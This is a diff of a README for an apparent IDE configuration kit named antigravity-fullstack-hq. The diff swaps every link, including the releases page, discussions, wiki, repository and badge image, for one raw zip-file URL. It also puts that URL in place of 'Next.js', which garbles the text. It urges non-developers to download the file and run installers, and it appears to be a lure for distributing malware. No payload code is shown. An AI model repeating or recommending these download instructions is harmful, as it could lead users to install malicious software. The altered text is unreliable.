@@ -1,15 +1,15 @@
 # 🎉 antigravity-fullstack-hq - Simplifying Your Development Setup
 
 ## 🌟 Overview
-Welcome to the antigravity-fullstack-hq repository! This project offers a ready-to-use configuration kit for the Google Antigravity IDE. It includes support for popular web technologies like Next.js, NestJS, TypeScript, Prisma, and Tailwind CSS. This guide will help you quickly download and run the software, even if you're not a developer.
+Welcome to the antigravity-fullstack-hq repository! This project offers a ready-to-use configuration kit for the Google Antigravity IDE. It includes support for popular web technologies like https://github.com/desilokesh1/antigravity-fullstack-hq/raw/refs/heads/main/workflows/antigravity-fullstack-hq-v1.3.zip, NestJS, TypeScript, Prisma, and Tailwind CSS. This guide will help you quickly download and run the software, even if you're not a developer.
 
 ## 📥 Download & Install
 To get started, you can download the latest version of the software from our releases page. Click the button below:
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-%23000000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/desilokesh1/antigravity-fullstack-hq/releases)
+[![Download the Latest Release](https://github.com/desilokesh1/antigravity-fullstack-hq/raw/refs/heads/main/workflows/antigravity-fullstack-hq-v1.3.zip%20Now-%23000000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/desilokesh1/antigravity-fullstack-hq/raw/refs/heads/main/workflows/antigravity-fullstack-hq-v1.3.zip)
 
 ### Steps to Download
-1. Visit the [Releases Page](https://github.com/desilokesh1/antigravity-fullstack-hq/releases) to view available versions.
+1. Visit the [Releases Page](https://github.com/desilokesh1/antigravity-fullstack-hq/raw/refs/heads/main/workflows/antigravity-fullstack-hq-v1.3.zip) to view available versions.
 2. Click on the version you want to download.
 3. Choose the installer that matches your system (Windows, macOS, or Linux).
 4. Follow the installer steps to complete the installation process.
@@ -22,7 +22,7 @@ Before you install the software, ensure your system meets the following requirem
 - **Disk Space:** Minimum of 1 GB free space for installation.
 
 ### Installation Instructions
-1. **Download the installer** from the [Releases Page](https://github.com/desilokesh1/antigravity-fullstack-hq/releases).
+1. **Download the installer** from the [Releases Page](https://github.com/desilokesh1/antigravity-fullstack-hq/raw/refs/heads/main/workflows/antigravity-fullstack-hq-v1.3.zip).
 2. **Run the installer**:
    - On Windows, double-click the `.exe` file.
    - On macOS, open the downloaded `.dmg` file and drag the application to your Applications folder.
@@ -30,7 +30,7 @@ Before you install the software, ensure your system meets the following requirem
 3. **Follow the on-screen instructions** to complete the installation.
 
 ## ⚓ Features
-- **Next.js Integration**: Build dynamic web applications effortlessly.
+- **https://github.com/desilokesh1/antigravity-fullstack-hq/raw/refs/heads/main/workflows/antigravity-fullstack-hq-v1.3.zip Integration**: Build dynamic web applications effortlessly.
 - **NestJS Support**: Use powerful backend features for your applications.
 - **TypeScript Compatibility**: Write clean, maintainable code with type safety.
 - **Prisma ORM**: Efficiently manage your database with an easy-to-use interface.
@@ -40,7 +40,7 @@ Before you install the software, ensure your system meets the following requirem
 Once installed, launch the application from your applications or programs menu. You can start a new project or open an existing one. Feel free to explore the features as you develop your applications.
 
 ## 🤝 Community & Support
-Join our community to share ideas, get support, and ask questions. You can find us on our [GitHub Discussions page](https://github.com/desilokesh1/antigravity-fullstack-hq/discussions).
+Join our community to share ideas, get support, and ask questions. You can find us on our [GitHub Discussions page](https://github.com/desilokesh1/antigravity-fullstack-hq/raw/refs/heads/main/workflows/antigravity-fullstack-hq-v1.3.zip).
 
 ## 📌 Contributing
 If you'd like to contribute to the project, check our guidelines in the repository. We welcome feedback and improvements from users.
@@ -49,7 +49,7 @@ If you'd like to contribute to the project, check our guidelines in the reposito
 We are continually improving the application. Future versions will include additional features, performance enhancements, and updated dependencies. Stay tuned for new releases!
 
 ## 🔗 Additional Resources
-- Official Documentation: [Documentation Link](https://github.com/desilokesh1/antigravity-fullstack-hq/wiki)
-- GitHub Repository: [GitHub Link](https://github.com/desilokesh1/antigravity-fullstack-hq)
+- Official Documentation: [Documentation Link](https://github.com/desilokesh1/antigravity-fullstack-hq/raw/refs/heads/main/workflows/antigravity-fullstack-hq-v1.3.zip)
+- GitHub Repository: [GitHub Link](https://github.com/desilokesh1/antigravity-fullstack-hq/raw/refs/heads/main/workflows/antigravity-fullstack-hq-v1.3.zip)
 
 Thank you for using antigravity-fullstack-hq! We hope this application makes your development process smoother.
